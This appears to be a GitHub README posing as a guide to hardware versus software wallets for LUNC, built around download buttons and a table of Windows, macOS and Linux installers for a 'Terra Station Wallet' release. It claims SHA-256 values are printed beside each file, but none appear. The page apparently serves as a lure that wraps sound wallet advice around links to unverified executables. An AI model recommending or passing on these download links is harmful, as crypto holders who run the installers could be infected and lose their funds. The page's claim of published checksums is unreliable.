![Terra Station Wallet](assets/banner-article.png)

# Hardware vs Software Wallet for LUNC

<p align="center"><a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-5392F7?style=for-the-badge&labelColor=101A42&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=E2EAFB" alt="Download for Windows"></a> <a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-5392F7?style=for-the-badge&labelColor=101A42&logo=apple&logoColor=E2EAFB" alt="Download for macOS"></a> <a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-5392F7?style=for-the-badge&labelColor=101A42&logo=linux&logoColor=E2EAFB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-5392F7?style=flat-square&labelColor=101A42&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=E2EAFB" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`terra-station-wallet-windows-v2.5.13.exe`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-windows-v2.5.13.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-5392F7?style=flat-square&labelColor=101A42&logo=apple&logoColor=E2EAFB" alt="macOS"> | macOS 12 or later | [`terra-station-wallet-macos-v2.5.13.dmg`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-macos-v2.5.13.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-5392F7?style=flat-square&labelColor=101A42&logo=linux&logoColor=E2EAFB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`terra-station-wallet-linux-v2.5.13.zip`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-linux-v2.5.13.zip) |

</div>

Every file in that table is attached to the [Terra Station Wallet release page](https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13), and the SHA-256 printed beside each name is the value published here.

> **Only download from this GitHub release page.** An installer offered anywhere else, however official it looks, is not a file this project published.

The choice is not about which app is better; it is about where the key sits when a transaction is signed. A software wallet holds the key on your computer and signs there. A hardware wallet keeps the key on a separate device and signs there, with the computer only relaying the transaction. Both can hold LUNC; they differ in what a compromised computer can do.

## The difference that matters

| | Software wallet | Hardware wallet |
|---|---|---|
| Key location | Encrypted file on your machine | Secure element on the device |
| Signing | On the computer | On the device, after physical confirmation |
| If the computer is compromised | The key is reachable in principle | The key is not on the computer |
| Cost | None | Device purchase |
| Convenience | High | One extra confirmation step |
| Backup | Recovery phrase | Recovery phrase, same idea |

The row that decides most cases is the third. Malware that can read a software wallet's keys can sign anything; against a hardware wallet, it can only ask, and the device shows what is being asked before you approve it.

## What a hardware wallet does not fix

- **A phrase typed into a website.** The device's security is irrelevant if you hand over the recovery phrase, because the phrase is the wallet.
- **Approving a transaction you did not read.** The device shows amounts and destinations; pressing confirm without reading defeats the point.
- **A wrong address.** The device can display it; it cannot know whether the recipient is who you think.
- **Loss of the device.** Without the phrase, a lost device is a lost wallet - the phrase is still the backup.

That list is why hardware is an improvement rather than a solution, and why the phrase discipline in https://github.com/terraclassic-wallet/lunc-wallet-recovery/blob/main/store-terra-station-phrase-offline.md matters at least as much as the device.

## How the pairing works in practice

A hardware wallet connected to Terra Station Wallet signs sends, delegations and claims on the device. The app builds the transaction, the device displays it, you confirm physically, and the signed result goes back to the app for broadcast.

The practical consequences:

1. The key never leaves the device, so the signing step is not on the computer at all.
2. Each transaction needs the device present, so a stolen laptop alone cannot move funds.
3. The displayed details on the device are the authoritative ones - if they differ from the app's summary, trust the device and stop.

https://github.com/terraclassic-wallet/lunc-wallet-recovery/blob/main/terra-station-ledger.md covers the device-specific setup and what the app expects to see when it connects.

## Who should use which

**A software wallet on its own** is reasonable when the balance is modest, the machine is clean and well maintained, and the phrase is stored offline. The threat model is a compromised computer, and a modest balance is a proportionate reason not to add friction.

**A hardware wallet** fits holdings large enough that a single malware infection would be a serious loss, and people who transact rarely enough that the extra confirmation is not a daily annoyance. It is also the natural choice for anyone who keeps a long-term position and interacts a few times a year.

**Both** is a common and sensible arrangement: a software wallet for everyday amounts, a hardware-backed wallet for the long-term holding, with the same app managing both.

## What to check before buying a device

- Buy from the manufacturer, not a marketplace listing, and check the packaging for tampering.
- The device must generate its own phrase during setup; a device that arrives with a phrase already written down is compromised.
- The manufacturer's app should verify the device, and the address shown on the device should match the one in Terra Station Wallet.
- Never enter an existing phrase into a device unless you understand it is being restored, not created.

## What changes if the device is lost

Nothing on the chain changes. The balance stays at your address, the delegations keep accruing, and the unbonding clock keeps running if you had one going. What you lose is the ability to sign until the phrase is restored on a replacement device or in a software wallet.

That is the reason to test the backup before relying on it: a hardware user who has never restored the phrase is one broken device away from discovering whether their backup was complete. Restoring once into a spare wallet, confirming the addresses, and removing it again costs a few minutes and turns an assumption into a fact.

## A note on the phrase for hardware users

The device holds the key, but the phrase still reconstructs the wallet - on another device, in a software wallet, anywhere. So a hardware user's phrase is as powerful as a software user's, and just as worth protecting offline. The device is an improvement in how signing happens, not a replacement for the backup.

*How to Choose a LUNC Wallet* puts this alongside the other decision criteria, and *Is Terra Station Wallet Safe for LUNC* covers the habits that keep either setup intact.

## Questions people ask

### Is a hardware wallet necessary?

Not for everyone. It changes what a compromised computer can do, so it matters most when the balance is large or the machine is shared.

### Can I use both at once?

Yes. The app can manage a software wallet for everyday use and a hardware-backed wallet for long-term holding, and you switch between them like any other wallet (https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/terra-station-multiple-wallets.md).

### Does a hardware wallet store my LUNC?

No. The LUNC is on Terra Classic at your address; the device stores the key that signs for it. Lose the device and the balance is still there, recoverable with the phrase.

### What happens if the device breaks?

Restore the phrase on a replacement device or a software wallet and carry on. That is exactly what the phrase is for, which is why it is backed up separately from the device itself.

Two small habits make either setup last. Check the address on the device, not just on the screen, for any transfer you would regret; and keep the device's firmware current, because a device whose firmware has not been updated can fail to sign a transaction the chain now expects. Neither habit costs anything, and both catch the failures that look like the wallet is broken.
